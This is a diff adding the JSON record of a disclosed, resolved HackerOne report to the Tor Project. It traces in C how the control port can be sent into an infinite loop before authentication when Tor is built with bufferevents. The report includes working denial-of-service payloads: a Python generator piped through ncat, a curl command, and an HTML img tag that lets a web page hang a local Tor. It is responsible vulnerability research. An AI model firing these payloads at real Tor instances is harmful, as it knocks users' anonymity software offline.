@@ -1,0 +1,111 @@
+{
+  "id": 113424,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTM0MjQ=",
+  "url": "https://hackerone.com/reports/113424",
+  "title": "[tor] control connection pre-auth DoS (infinite loop) with --enable-bufferevents",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-01-29T05:43:35.625Z",
+  "submitted_at": "2016-01-29T05:43:35.625Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "guido",
+    "url": "/guido",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1800,
+    "url": "https://hackerone.com/torproject",
+    "handle": "torproject",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Tor",
+      "twitter_handle": "torproject",
+      "website": "https://www.torproject.org/",
+      "about": "Anonymity Online"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-10-19T10:15:36.573Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-19T10:15:36.485Z",
+  "team_member_agreed_on_going_public_at": "2017-10-19T09:38:21.219Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "In control.c, this is the loop that retrieves data from the input buffer of the connection, or returns if no complete linefreed-terminated line is available (connection_fetch_from_buf_line() returns 0).\n\n```c\n4225   while (1) {\n4226     size_t last_idx;\n4227     int r;\n4228     /* First, fetch a line. */\n4229     do {\n4230       data_len = conn->incoming_cmd_len - conn->incoming_cmd_cur_len;\n4231       r = connection_fetch_from_buf_line(TO_CONN(conn),\n4232                               conn->incoming_cmd+conn->incoming_cmd_cur_len,\n4233                               &data_len);\n4234       if (r == 0)\n4235         /* Line not all here yet. Wait. */\n4236         return 0;\n4237       else if (r == -1) {\n4238         if (data_len + conn->incoming_cmd_cur_len > MAX_COMMAND_LINE_LENGTH) {\n4239           connection_write_str_to_buf(\"500 Line too long.\\r\\n\", conn);\n4240           connection_stop_reading(TO_CONN(conn));\n4241           connection_mark_and_flush(TO_CONN(conn));\n4242         }\n4243         while (conn->incoming_cmd_len < data_len+conn->incoming_cmd_cur_len)\n4244           conn->incoming_cmd_len *= 2;\n4245         conn->incoming_cmd = tor_realloc(conn->incoming_cmd,\n4246                                          conn->incoming_cmd_len);\n4247       }\n4248     } while (r != 1);\n```\n\nIf connection_fetch_from_buf_line() returns -1, this means that the buffer (conn->incoming_cmd) is not large enough. conn->incoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().\n\nIf libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():\n\n```c\n3785   }) ELSE_IF_NO_BUFFEREVENT {\n3786     return fetch_from_buf_line(conn->inbuf, data, data_len);\n3787   } \n```\n\nThis function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):\n\n```c\n2241 int\n2242 fetch_from_buf_line(buf_t *buf, char *data_out, size_t *data_len)\n2243 {\n2244   size_t sz;\n2245   off_t offset;\n2246 \n2247   if (!buf->head)\n2248     return 0;\n2249     \n2250   offset = buf_find_offset_of_char(buf, '\\n');\n2251   if (offset < 0)\n2252     return 0;\n2253   sz = (size_t) offset;\n2254   if (sz+2 > *data_len) {\n2255     *data_len = sz + 2;\n2256     return -1;\n2257   } \n2258   fetch_from_buf(data_out, sz+1, buf);   \n2259   data_out[sz+1] = '\\0';\n2260   *data_len = sz+1; \n2261   return 1;\n2262 }   \n```\n\nHowever, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:\n\n```c\n3765 int \n3766 connection_fetch_from_buf_line(connection_t *conn, char *data,\n3767                                size_t *data_len)\n3768 {   \n3769   IF_HAS_BUFFEREVENT(conn, {\n3770     int r;\n3771     size_t eol_len=0;\n3772     struct evbuffer *input = bufferevent_get_input(conn->bufev);\n3773     struct evbuffer_ptr ptr =\n3774       evbuffer_search_eol(input, NULL, &eol_len, EVBUFFER_EOL_LF);\n3775     if (ptr.pos == -1)\n3776       return 0; /* No EOL found. */\n3777     if ((size_t)ptr.pos+eol_len >= *data_len) {\n3778       return -1; /* Too long */\n3779     }     \n3780     *data_len = ptr.pos+eol_len;\n3781     r = evbuffer_remove(input, data, ptr.pos+eol_len);\n3782     tor_assert(r >= 0);\n3783     data[ptr.pos+eol_len] = '\\0';\n3784     return 1;\n3785   }) ELSE_IF_NO_BUFFEREVENT {            \n3786     return fetch_from_buf_line(conn->inbuf, data, data_len);\n3787   }\n3788 }\n```\n\nFollowing the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.\n\nFor incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.\n\n# Proof of concept\n$ ./configure --enable-bufferevents && make -j4\n\nNow start tor with this torrc:\n\nControlPort 9999\n\nthen in another terminal:\n\n$ cat genpoc.py \nimport sys\nsys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )\n\n$ python genpoc.py >poc\n$ ncat localhost 9999 <poc\n\ntor now hangs and has to be killed with force (kill -9 <pid>).\n\n#Inter-protocol exploit\n\nSince the only two prerequisites of the attack are:\n\n- Input longer than 1024 bytes\n- Input contains linefeed character after byte 1024\n\nit's easy to think of other ways of making tor hang than manually creating a connection for this purpose.\n\n```\n$ cat genpoc2.py \nprint \"curl http://localhost:9999/{}\".format(\"x\" * 1200)\n$ python genpoc2.py >poc.sh\n$ bash poc.sh\n```\n\nThis also causes tor to hang, because curl is sending this to tor:\n\n````\nGET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: localhost:9999\nAccept: */*\n\n```\n\nwhich is data that adheres to the prerequisites.\n\nThus, a person running tor with the control server running locally while also using a regular browser can be DoSed via:\n\n```html\n<img src='http://localhost:9999/xxxxxxxxxxxxxxxxxxx...'>\n```\n\nGuido",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-11-18T09:38:21.280Z",
+  "allow_singular_disclosure_after": -266751525.57970926,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "nischalxd",
+    "pr0f0x01",
+    "geeknik",
+    "eveeez",
+    "mr_r3boot",
+    "spetr0x",
+    "b4155f7c29acd42c27d007a"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
